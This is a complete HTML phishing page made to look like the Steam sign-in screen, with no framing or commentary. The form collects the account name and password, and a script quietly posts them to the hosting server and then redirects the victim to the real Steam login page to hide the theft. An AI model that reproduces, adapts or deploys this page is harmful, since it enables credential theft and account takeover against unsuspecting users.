<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Steam Sign In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,Helvetica,sans-serif;background:#1b2838}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#16202d;border-radius:4px;padding:40px;width:400px}.logo{text-align:center;margin-bottom:30px;color:#c7d5e0;font-size:28px;font-weight:700}input{width:100%;padding:12px;background:#1b2838;border:1px solid #233c51;border-radius:2px;color:#c7d5e0;font-size:15px;margin-bottom:20px;outline:none}input:focus{border-color:#66c0f4}input[type="submit"]{background:linear-gradient(to right,#47bfff,#1a44c2);color:white;border:none;font-size:16px;font-weight:400;cursor:pointer;border-radius:2px}input[type="submit"]:hover{background:linear-gradient(to right,#5cc7ff,#2351d4)}.link{color:#afafaf;font-size:13px;text-align:center;margin-top:20px}.link a{color:#afafaf;text-decoration:none}.link a:hover{color:white}</style></head><body><div class="container"><div class="box"><div class="logo">STEAM</div><form method="POST"><input type="text"name="username"placeholder="Steam account name"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Sign In"></form><div class="link"><a href="#">Forgot your password?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://store.steampowered.com/login';});});</script></body></html>
